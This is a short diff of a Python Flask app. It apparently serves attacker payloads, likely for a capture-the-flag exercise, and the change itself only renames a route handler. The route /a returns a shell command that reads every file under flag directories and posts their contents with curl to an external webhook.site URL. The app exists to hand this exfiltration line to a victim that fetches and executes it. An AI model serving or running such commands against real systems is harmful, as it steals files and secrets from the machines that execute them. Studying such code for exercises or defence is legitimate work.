@@ -19,7 +19,7 @@ def get_index():
     return 'use static', 200
 
 @app.route('/a', methods=['GET'])
-def get_index():
+def get_script():
     return 'cat flag/*/* | curl -X POST --data-binary @- https://webhook.site/3ac78532-8d8b-4257-8593-3ee232134985', 200
 
 @app.route('/redirect')
